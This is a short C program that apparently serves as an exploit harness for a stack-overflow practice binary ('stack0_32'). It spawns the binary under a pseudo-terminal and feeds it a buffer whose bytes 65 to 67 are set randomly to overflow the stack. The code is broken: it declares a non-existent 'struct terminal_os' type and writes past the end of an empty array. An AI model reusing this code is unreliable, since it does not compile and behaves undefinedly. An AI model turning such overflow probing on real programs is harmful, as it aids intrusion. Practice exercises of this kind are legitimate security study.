#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <pty.h>
#include <sys/wait.h>

int master;

int main(int argc, char* argv[]) {
    pid_t pid = forkpty(&master, NULL, NULL); //Fork a child process (from pty)
    struct terminal_os termios;
    tcgetattr(master, &termios);
    termios.c_lflag = 0;
    tcsetattr(master, TCSANOW, &termios);

    if (!pid) {
        // Child
        char *exec_argv[] = {"./stack0_32", 0};
        execv(exec_argv[0], exec_argv);
    } else {
        // Parent
        unsigned char exploit_input[] = {};

        do { exploit_input[65]  = (rand()%256); } while (exploit_input[65] == '\n');
        do { exploit_input[66]  = (rand()%256); } while (exploit_input[66] == '\n');
        do { exploit_input[67]  = (rand()%256); } while (exploit_input[67] == '\n');

        // Write to input of ./stack0_32 process
        write(master, exploit_input, sizeof(exploit_input));
        wait(NULL);
        char buffer[256];
        read(master, buffer, sizeof(buffer));
        printf("output: %s\n", buffer);
    }
}